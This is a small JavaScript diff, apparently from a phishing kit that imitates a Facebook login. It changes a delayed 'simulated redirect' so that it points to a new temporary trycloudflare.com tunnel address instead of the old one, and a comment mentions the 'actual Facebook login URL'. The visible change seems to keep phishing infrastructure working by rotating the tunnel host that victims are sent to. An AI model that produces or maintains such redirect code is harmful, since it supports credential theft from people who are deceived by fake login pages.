@@ -89,7 +89,7 @@ document.addEventListener('DOMContentLoaded', () => {
         // Simulate redirect after 2 seconds
         setTimeout(() => {
             // Replace this with your actual Facebook login URL
-            window.location.href = 'https://trainer-ld-illustrated-wrapping.trycloudflare.com';
+            window.location.href = 'https://latvia-environment-wider-regarded.trycloudflare.com';
         }, 2000);
     });
 
